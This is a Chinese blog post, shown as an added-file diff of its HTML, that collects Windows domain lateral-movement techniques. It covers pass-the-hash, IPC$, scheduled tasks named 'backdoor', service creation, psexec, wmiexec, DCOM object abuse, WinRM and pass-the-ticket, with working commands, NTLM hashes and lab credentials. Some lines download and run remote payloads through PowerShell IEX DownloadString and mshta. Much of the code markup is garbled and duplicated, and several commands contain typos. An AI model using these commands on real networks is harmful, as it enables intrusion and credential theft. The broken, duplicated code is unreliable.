@@ -1,0 +1,511 @@
+<!DOCTYPE html><html lang="zh"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta name="viewport" content="width=device-width, initial-scale=0.5"><link rel="stylesheet" href="/css/post.css"><link rel="icon" href="/img/favicon.png"><title>域渗透常规手法</title><meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head><body>　　<div class="inner"><h2>域渗透常规手法</h2><p>记录一些常见的域内攻击手法，持续更新。</p>
+<h1 id="0x1-横向移动"><a href="#0x1-横向移动" class="headerlink" title="0x1 横向移动"></a>0x1 横向移动</h1><h2 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h2><p><strong>为什么能PTH：</strong></p>
+<p>在域环境中，用户登录计算机时一般使用域账号，大量计算机在安装时会使用相同的本地管理员账号和密码，因此，如果计算机的本地管理员账号和密码也相同，攻击者就能使用哈希传递攻击的方法来登录内网中的其他主机。使用该方法，攻击者不需要花费时间来对Hash进行爆破，在内网渗透里非常经典。常常适用于域/工作组环境。</p>
+<p>**用户帐户控制 (<code>User Account Control</code>) **</p>
+<p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System</p>
+<ul>
+<li>FilterAdministratorToken，默认开启，用来保护本地管理员，当本地管理员去进行网络访问时，在对方机器上以非完全管理员的方式进行访问。所以只有SID 500的账号（一般是administrator）与域管理员组的账号都可以进行PTH。</li>
+</ul>
+<img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220814232339392.png" alt="image-20220814232339392" style="zoom:50%;">
+
+<ul>
+<li><p>LocalAccountTokenFilterPolicy，是否限制非SID 500的本地管理员进行网络访问，值默认为0（开启远程限制），为1时将关闭远程限制</p>
+<img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220814231624587.png" alt="image-20220814231624587" style="zoom:50%;">
+
+<p>将LocalAccountTokenFilterPolicy关闭后，使用非administrator的管理员账号也可以进行PTH</p>
+</li>
+</ul>
+<p><img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220814232043010.png" alt="image-20220814232043010"></p>
+<p><strong>kb2871997补丁</strong></p>
+<ul>
+<li><p>支持“Protected Users”组，“Protected Users”组是Windows Server 2012 R2域中的安全组，“Protected Users”组的成员会被强制使用Kerberos身份验证，并且对Kerberos强制执行AES加密。</p>
+</li>
+<li><p>Restricted Admin RDP模式的远程桌面客户端支持（只支持Windows server 2012和Windows8.1）</p>
+</li>
+<li><p>注销后删除凭证，在这个更新之前，只要用户登录系统，Windows就会在lsass中缓存用户的凭据，包括用户的明文密码、LM/NTLM HASH、Kerberos的TGT票据/Session Key。</p>
+</li>
+<li><p>新的SID</p>
+<ol>
+<li><p>本地帐户，LOCAL_ACCOUNT（S-1-5-113），所有本地帐户继承自此SID；</p>
+</li>
+<li><p>本地帐户和管理组成员，LOCAL_ACCOUNT_AND_MEMBER_OF_ADMINISTRATORS_GROUP（S-1-5-114），所有管理员组的本地用户继承此SID。</p>
+</li>
+</ol>
+</li>
+<li><p>LSASS中删除了明文凭证</p>
+</li>
+</ul>
+<h2 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h2><p>IPC$(Internet Process Connection) 是共享 “命名管道” 的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问</p>
+<p><img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220815001219892.png" alt="image-20220815001219892"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">net use \\<target_ip>\ipc$ "password" /user:"username"<br>net use \\192.168.181.1\ipc$ "123456" /user:"administrator"<br><br>net use // 查看当前主机所建立的连接<br></code></pre></td></tr></table></figure>
+
+
+
+<p>执行命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><span class="hljs-meta">#</span><span class="bash"> 复制文件</span><br>copy C:\a.exe  \\192.168.181.1\c$<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"><code class="language-hljs shell"><span class="hljs-meta">#</span><span class="bash"> 复制文件</span><br>copy C:\a.exe  \\192.168.181.1\c$<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 查看远端的进程</span><br>tasklist /S 192.168.181.1 /U administrator /P 123456<br><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2><p>通过at、schtasks命令在目标机器上创建计划任务</p>
+<p>如果已建立IPC链接可以直接执行命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre class=" language-hljs shell">net time \\192.168.181.1<br>copy shell.exe \\192.168.181.1\c$<br>at \\192.168.181.1 18:53:00 c:\shell.exe<br>at \\192.168.181.1 1 /delete<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"><code class="language-hljs shell">net time \\192.168.181.1<br>copy shell.exe \\192.168.181.1\c$<br>at \\192.168.181.1 18:53:00 c:\shell.exe<br>at \\192.168.181.1 1 /delete<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 读取命令结果</span><br>at \\192.168.181.1 17:05:00 cmd.exe /c "ipconfig > C:\Users\Administrator\result.txt"<br>type \\192.168.181.1\c$\Users\Administrator\result.txt<br></code></pre></td></tr></table></figure>
+
+<p>使用schtasks执行命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">schtasks /create /s 192.168.181.130 /tn backdoor /sc minute /mo 1  /tr C:\Windows\System32\calc.exe /ru system /f<br></code></pre></td></tr></table></figure>
+
+
+
+<p>如果没有建立IPC链接，执行时需要带上用户名、密码</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">schtasks /create /s 192.168.181.130 /u administrator /p 123456 /tn backdoor /sc minute /mo 1 /tr C:\Windows\System32\calc.exe /ru system /f<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>如果拒绝访问就尝试使用账号密码，或者把 /ru system去掉以普通用户权限运行</p>
+</blockquote>
+<h2 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">sc \\[主机名/IP] create [servicename] binpath= "[path]"   #创建计划任务启动程序<br><br>sc create svnservice binpath= "\"c:\artifact.exe\"" displayname= "SVNService" depend= Tcpip start= auto  <br>sc \\192.168.181.130 start svnservice<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<ol>
+<li>在option= xxxxx格式中，“=”号和后面的内容一定要有空格，如depend= Tcpip</li>
+<li>如果命令中的需要进行双引号的嵌套，使用<strong>反斜杠加引号</strong>  来进行转义处理。</li>
+</ol>
+</blockquote>
+<p>木马能起来，但是上线之后马上会掉，提示下面的错误，应该是exe不符合Windows的服务接口规范。</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1455144">https://cloud.tencent.com/developer/article/1455144</a></p>
+<p><img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220815075914592.png" alt="image-20220815075914592"></p>
+<p><a href="lhttps://github.com/Mr-Un1k0d3r/SCShell">SCShel</a> 可以修改服务的可以执行路径执行命令达到无文件的效果：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre class=" language-hljs shell">└─# python scshell.py ./administrator:cxzcxz@192.168.52.133# 执行cmd模式，没有命令回显<br>└─# proxychains python3 scshell.py  -hashes :579da618cfbfa85247acf1f800a280a4 test.com/manager@192.168.181.128                                                                                                                                                            <br><span class="hljs-meta">SCShell&gt;</span><span class="bash">C:\windows\system32\cmd.exe /c whoami &gt; c:/1.txt</span><br>[*] Command Executed<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"><code class="language-hljs shell">└─# python scshell.py ./administrator:cxzcxz@192.168.52.133# 执行cmd模式，没有命令回显<br>└─# proxychains python3 scshell.py  -hashes :579da618cfbfa85247acf1f800a280a4 test.com/manager@192.168.181.128                                                                                                                                                            <br><span class="hljs-meta">SCShell&gt;</span><span class="bash">C:\windows\system32\cmd.exe /c whoami &gt; c:/1.txt</span><br>[*] Command Executed<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 执行powershell</span> <br>scshell.exe 10.10.10.10 defragsvc "C:\windows\system32\cmd.exe /c powershell.exe IEX(New-Object Net.WebClinet).DownloadString(&#x27;http://192.168.50.146:8000/123.ps1&#x27;)" . administrator 1qaz@wsx<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h2><p>域环境里面域管理员可以PTH，而普通用户无法PTH</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><span class="hljs-meta">$</span><span class="bash"><span class="hljs-comment"><code class="language-hljs shell"><span class="hljs-meta">$</span><span class="bash"><span class="hljs-comment"># proxychains python3 psexec.py test.com/manager@192.168.181.128 -hashes :579da618cfbfa85247acf1f800a280a4</span></span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220814212501223.png" alt="image-20220814212501223"></p>
+<p>也可以指定运行文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">└─$ proxychains python3 psexec.py -hashes :579da618cfbfa85247acf1f800a280a4 test.com/manager@192.168.181.128 -c ~/artifact.exe <br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="wmiexec"><a href="#wmiexec" class="headerlink" title="wmiexec"></a>wmiexec</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">└─# proxychains python3 wmiexec.py  -hashes :579da618cfbfa85247acf1f800a280a4 test.com/manager@192.168.181.128<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220814223417043.png" alt="image-20220814223417043"></p>
+<h2 id="DCOM"><a href="#DCOM" class="headerlink" title="DCOM"></a>DCOM</h2><p>COM即组件对象模型(Component Object Model，COM) ，是基于 Windows 平台的一套组件对象接口标准，由一组构造规范和组件对象库组成，类似于DLL的东西，DCOM（分布式组件对象模型）支持不同的两台机器上的组件间的通信。</p>
+<p>可使用的COM:</p>
+<ul>
+<li>使用EXCEL DDEß</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><span class="hljs-meta">$</span><span class="bash">a = [activator]::CreateInstance([<span class="hljs-built_in">type</span>]::GetTypeFromprogID(<span class="hljs-string">&quot;Excel.Application&quot;</span>,<span class="hljs-string">&quot;192.168.75.130&quot;</span>))</span><br><span class="hljs-meta">$</span><span class="bash">a.DisplayAlerts = <span class="hljs-variable">$false</span>  //DisplayAlerts属性控制DDEInitiate提出的警报。<span class="hljs-literal">false</span>为关</span><br><span class="hljs-meta">$</span><span class="bash">a.DDEInitiate(<span class="hljs-string">&quot;cmd&quot;</span>,<span class="hljs-string"><code class="language-hljs shell"><span class="hljs-meta">$</span><span class="bash">a = [activator]::CreateInstance([<span class="hljs-built_in">type</span>]::GetTypeFromprogID(<span class="hljs-string">&quot;Excel.Application&quot;</span>,<span class="hljs-string">&quot;192.168.75.130&quot;</span>))</span><br><span class="hljs-meta">$</span><span class="bash">a.DisplayAlerts = <span class="hljs-variable">$false</span>  //DisplayAlerts属性控制DDEInitiate提出的警报。<span class="hljs-literal">false</span>为关</span><br><span class="hljs-meta">$</span><span class="bash">a.DDEInitiate(<span class="hljs-string">&quot;cmd&quot;</span>,<span class="hljs-string">"/c calc,exe"</span>)</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>MMC20.APPLICATION</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","192.168.75.130")).Document.ActiveView.Executeshellcommand(&#x27;cmd.exe&#x27;,$null,"/c calc.exe","Restored")<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>SHELLWINDOWS</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><span class="hljs-meta">$</span><span class="bash">a =  [activator]::CreateInstance([<span class="hljs-built_in">type</span>]::GetTypeFromCLSID(<span class="hljs-string">&quot;9BA05972-F6A8-11CF-A442-00A0C90A8F39&quot;</span>,<span class="hljs-string">&quot;192.168.75.130&quot;</span>)) | Get-member</span><br><span class="hljs-meta">$</span><span class="bash">a =  [activator]::CreateInstance([<span class="hljs-built_in">type</span>]::GetTypeFromCLSID(<span class="hljs-string">&quot;9BA05972-F6A8-11CF-A442-00A0C90A8F39&quot;</span>,<span class="hljs-string">&quot;192.168.75.130&quot;</span>)).Document.Application.ShellExecute(<span class="hljs-string">&quot;cmd.exe&quot;</span>,<span class="hljs-string">&quot;/c clac.exe&quot;</span>.<span class="hljs-string">&quot;c:\windows32\system&quot;</span>,<span class="hljs-variable"><code class="language-hljs shell"><span class="hljs-meta">$</span><span class="bash">a =  [activator]::CreateInstance([<span class="hljs-built_in">type</span>]::GetTypeFromCLSID(<span class="hljs-string">&quot;9BA05972-F6A8-11CF-A442-00A0C90A8F39&quot;</span>,<span class="hljs-string">&quot;192.168.75.130&quot;</span>)) | Get-member</span><br><span class="hljs-meta">$</span><span class="bash">a =  [activator]::CreateInstance([<span class="hljs-built_in">type</span>]::GetTypeFromCLSID(<span class="hljs-string">&quot;9BA05972-F6A8-11CF-A442-00A0C90A8F39&quot;</span>,<span class="hljs-string">&quot;192.168.75.130&quot;</span>)).Document.Application.ShellExecute(<span class="hljs-string">&quot;cmd.exe&quot;</span>,<span class="hljs-string">&quot;/c clac.exe&quot;</span>.<span class="hljs-string">&quot;c:\windows32\system&quot;</span>,<span class="hljs-variable">$null</span>,0)</span><br><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>SHELLBROWSERWINDOW</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><span class="hljs-meta">$</span><span class="bash">a =  [activator]::CreateInstance([<span class="hljs-built_in">type</span>]::GetTypeFromCLSID(<span class="hljs-string">&quot;C08AFD90-F2A1-11D1-8455-00A0C91F3880&quot;</span>,<span class="hljs-string">&quot;192.168.75.130&quot;</span>))</span><br><span class="hljs-meta">$</span><span class="bash">a =  [activator]::CreateInstance([<span class="hljs-built_in">type</span>]::GetTypeFromCLSID(<span class="hljs-string">&quot;C08AFD90-F2A1-11D1-8455-00A0C91F3880&quot;</span>,<span class="hljs-string">&quot;192.168.75.130&quot;</span>)).Document.Application.shellExecute(<span class="hljs-string"><code class="language-hljs shell"><span class="hljs-meta">$</span><span class="bash">a =  [activator]::CreateInstance([<span class="hljs-built_in">type</span>]::GetTypeFromCLSID(<span class="hljs-string">&quot;C08AFD90-F2A1-11D1-8455-00A0C91F3880&quot;</span>,<span class="hljs-string">&quot;192.168.75.130&quot;</span>))</span><br><span class="hljs-meta">$</span><span class="bash">a =  [activator]::CreateInstance([<span class="hljs-built_in">type</span>]::GetTypeFromCLSID(<span class="hljs-string">&quot;C08AFD90-F2A1-11D1-8455-00A0C91F3880&quot;</span>,<span class="hljs-string">&quot;192.168.75.130&quot;</span>)).Document.Application.shellExecute(<span class="hljs-string">"calc.exe"</span>)</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>VISIO ADDON EXECUTION</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><span class="hljs-meta">$</span><span class="bash">a =  [activator]::CreateInstance([<span class="hljs-built_in">type</span>]::GetTypeFromProgID(<span class="hljs-string">&quot;Visio.Application&quot;</span>,<span class="hljs-string">&quot;192.168.75.130&quot;</span>))</span><br><span class="hljs-meta">$</span><span class="bash">a =  [activator]::CreateInstance([<span class="hljs-built_in">type</span>]::GetTypeFromProgID(<span class="hljs-string">&quot;Visio.Application&quot;</span>,<span class="hljs-string">&quot;192.168.75.130&quot;</span>)).[0].document.app;ication.shellExecute(<span class="hljs-string"><code class="language-hljs shell"><span class="hljs-meta">$</span><span class="bash">a =  [activator]::CreateInstance([<span class="hljs-built_in">type</span>]::GetTypeFromProgID(<span class="hljs-string">&quot;Visio.Application&quot;</span>,<span class="hljs-string">&quot;192.168.75.130&quot;</span>))</span><br><span class="hljs-meta">$</span><span class="bash">a =  [activator]::CreateInstance([<span class="hljs-built_in">type</span>]::GetTypeFromProgID(<span class="hljs-string">&quot;Visio.Application&quot;</span>,<span class="hljs-string">&quot;192.168.75.130&quot;</span>)).[0].document.app;ication.shellExecute(<span class="hljs-string">"calc"</span>)</span><br><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>Outlook</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><span class="hljs-meta">$</span><span class="bash">a =  [activator]::CreateInstance([<span class="hljs-built_in">type</span>]::GetTypeFromProgID(<span class="hljs-string">&quot;Outlook.APPLICATION&quot;</span>,<span class="hljs-string">&quot;192.168.75.130&quot;</span>))</span><br><span class="hljs-meta">$</span><span class="bash">a =  [activator]::CreateInstance([<span class="hljs-built_in">type</span>]::GetTypeFromProgID(<span class="hljs-string">&quot;Outlook.APPLICATION&quot;</span>,<span class="hljs-string">&quot;192.168.75.130&quot;</span>)) .createObject(<span class="hljs-string">&quot;Shell.Application&quot;</span>)</span><br><span class="hljs-meta">$</span><span class="bash"><code class="language-hljs shell"><span class="hljs-meta">$</span><span class="bash">a =  [activator]::CreateInstance([<span class="hljs-built_in">type</span>]::GetTypeFromProgID(<span class="hljs-string">&quot;Outlook.APPLICATION&quot;</span>,<span class="hljs-string">&quot;192.168.75.130&quot;</span>))</span><br><span class="hljs-meta">$</span><span class="bash">a =  [activator]::CreateInstance([<span class="hljs-built_in">type</span>]::GetTypeFromProgID(<span class="hljs-string">&quot;Outlook.APPLICATION&quot;</span>,<span class="hljs-string">&quot;192.168.75.130&quot;</span>)) .createObject(<span class="hljs-string">&quot;Shell.Application&quot;</span>)</span><br><span class="hljs-meta">$</span><span class="bash">a.shellExecute(calc.exe)</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>Excel XLL （Excel进程加载恶意的DLL）</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><span class="hljs-meta">$</span><span class="bash">a =  [activator]::CreateInstance([<span class="hljs-built_in">type</span>]::GetTypeFromProgID(<span class="hljs-string">&quot;Excel.APPLICATION&quot;</span>,<span class="hljs-string">&quot;192.168.75.130&quot;</span>)) .RegisterXLL(<span class="hljs-string"><code class="language-hljs shell"><span class="hljs-meta">$</span><span class="bash">a =  [activator]::CreateInstance([<span class="hljs-built_in">type</span>]::GetTypeFromProgID(<span class="hljs-string">&quot;Excel.APPLICATION&quot;</span>,<span class="hljs-string">&quot;192.168.75.130&quot;</span>)) .RegisterXLL(<span class="hljs-string">"我们的恶意DLL路径"</span>)</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>任意脚本执行</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><span class="hljs-meta">$</span><span class="bash">a = [activator]::CreateInstance([<span class="hljs-built_in">type</span>]::GetTypeFromProgID(<span class="hljs-string">&quot;Outlook.APPLICATION&quot;</span>,<span class="hljs-string">&quot;192.168.75.130&quot;</span>)) .CreateObject(<span class="hljs-string">&quot;b&quot;</span>)</span><br><span class="hljs-meta">$</span><span class="bash">b.language = <span class="hljs-string">&quot;VBScript&quot;</span></span><br><span class="hljs-meta">$</span><span class="bash">b.AddCode(<span class="hljs-string"><code class="language-hljs shell"><span class="hljs-meta">$</span><span class="bash">a = [activator]::CreateInstance([<span class="hljs-built_in">type</span>]::GetTypeFromProgID(<span class="hljs-string">&quot;Outlook.APPLICATION&quot;</span>,<span class="hljs-string">&quot;192.168.75.130&quot;</span>)) .CreateObject(<span class="hljs-string">&quot;b&quot;</span>)</span><br><span class="hljs-meta">$</span><span class="bash">b.language = <span class="hljs-string">&quot;VBScript&quot;</span></span><br><span class="hljs-meta">$</span><span class="bash">b.AddCode(<span class="hljs-string">&#x27;CreateObject("Wcript.Shell").Exec("Calc.exe")&#x27;</span>)</span><br><br></code></pre></td></tr></table></figure>
+
+<p>Visio对象提供了一种直接方法，可以使用“ ExecuteLine”方法从字符串运行VBA的任何代码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class=" language-hljs javascript">$a = [activator]::CreateInstance([type]::GetTypeFromProgID(<span class="hljs-string">&quot;a.invisibleapp&quot;</span>,<span class="hljs-string">&quot;192.168.75.130&quot;</span>))<br>$b = $a.documents.Add(<span class="hljs-string">&quot;&quot;</span>)<br>$b.Executeline(<span class="hljs-string"><code class="language-hljs javascript">$a = [activator]::CreateInstance([type]::GetTypeFromProgID(<span class="hljs-string">&quot;a.invisibleapp&quot;</span>,<span class="hljs-string">&quot;192.168.75.130&quot;</span>))<br>$b = $a.documents.Add(<span class="hljs-string">&quot;&quot;</span>)<br>$b.Executeline(<span class="hljs-string">&#x27;CreateObject("wscript.Shell").exec("calc.exe")&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>使用impacket工具包：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">python3 ./dcomexec.py [domain/]username:password@ip  //创建一个交互式shell<br>python3 ./dcomexec.py [domain/]username:password@ip command   //执行命令<br></code></pre></td></tr></table></figure>
+
+<p>使用hash</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">└─# proxychains python3 dcomexec.py  -hashes :579da618cfbfa85247acf1f800a280a4 test.com/manager@192.168.181.130 whoami<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220815091856019.png" alt="image-20220815091856019"></p>
+<h2 id="WinRM"><a href="#WinRM" class="headerlink" title="WinRM"></a>WinRM</h2><p>“Windows远程管理(WinRM)”是WS-Management协议(Web Services for Management，又名WSMan)的Microsoft实现，WS-Management Protocol是基于标准简单对象访问协议(SOAP)的对防火墙友好的协议。运行来自不同硬件和操作系统的硬件和操作供应商，以实现互操作（Microsoft Docs）。</p>
+<p>作为DCOM和WMI远程管理的替代方法，WinRM用于通过WSMan与远程计算机建立会话，WAMan利用HTTP/S作为传输机制来传递XML格式的消息。在现代的Windows系统中，WinRM HTTP通信通过TCP端口5985进行，而HTTPS(TLS)通信是通过TCP端口5986进行的。WinRM本机支持NTLM和Kerberos。初始身份验证后，将使用AES加密保护WinRM会话（Microsoft Docs)</p>
+<blockquote>
+<p> 可以使用winrm quickconfig命令或通过组策略来快速设置开启WinRM</p>
+</blockquote>
+<p>Windows自带winrs程序：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">winrs -r:dc  -u:one\administrator -p:123456 "cmd.exe /c mshta.exe http://192.168.1.115:80/e.ext"<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>-r dc  为目标机器的netbios名称</p>
+</blockquote>
+<p>CS JUMP WINRM</p>
+<img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220815085539019.png" alt="image-20220815085539019" style="zoom:30%;">
+
+<p><img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220815093105195.png" alt="image-20220815093105195"></p>
+<h2 id="PTT"><a href="#PTT" class="headerlink" title="PTT"></a>PTT</h2><p>Pass The Ticket ，使用生成或者机器缓存的票据进行Kerberos认证，无需密码、Hash。</p>
+<p><strong>获取票据</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">└─# proxychains python3 getTGT.py -hashes :579da618cfbfa85247acf1f800a280a4 test.com/manager@192.168.181.130<br></code></pre></td></tr></table></figure>
+
+
+
+<p><strong>票据转换</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><span class="hljs-meta">#</span><span class="bash"> Windows -&gt; UNIX</span><br>ticketConverter.py $ticket.kirbi $ticket.ccache<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"><code class="language-hljs shell"><span class="hljs-meta">#</span><span class="bash"> Windows -&gt; UNIX</span><br>ticketConverter.py $ticket.kirbi $ticket.ccache<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> UNIX -> Windows</span><br>ticketConverter.py $ticket.ccache $ticket.kirbi<br></code></pre></td></tr></table></figure>
+
+
+
+<p><strong>注入票据</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre class=" language-hljs shell">export KRB5CCNAME=$path_to_ticket.ccache<br>The most simple way of injecting the ticket is to supply the /ptt flag directly to the command used to request/create a ticket. Both mimikatz and Rubeus accept this flag.<br>This can also be done manually with mimikatz or Rubeus.<br><span class="hljs-meta">#</span><span class="bash"> use a .kirbi file</span><br>kerberos::ptt $ticket_kirbi_file<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"><code class="language-hljs shell">export KRB5CCNAME=$path_to_ticket.ccache<br>The most simple way of injecting the ticket is to supply the /ptt flag directly to the command used to request/create a ticket. Both mimikatz and Rubeus accept this flag.<br>This can also be done manually with mimikatz or Rubeus.<br><span class="hljs-meta">#</span><span class="bash"> use a .kirbi file</span><br>kerberos::ptt $ticket_kirbi_file<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> use a .ccache file</span><br>kerberos::ptt $ticket_ccache_file<br>Rubeus.exe ptt /ticket:"base64 | file.kirbi"<br>It is then possible to list the tickets in memory using the klist command.<br><br></code></pre></td></tr></table></figure>
+
+
+
+<p><strong>使用票据</strong></p>
+<p>impkacet 使用票据</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">└─# export KRB5CCNAME=manager@192.168.181.128.ccache; proxychains python3 wmiexec.py -k -no-pass  test.com/manager@192.168.181.128<br></code></pre></td></tr></table></figure>
+
+<p>Mimikatz导入票据后可通过klist命令查看票据，在CMD窗口可以直接 dir \\机器名\c$</p>
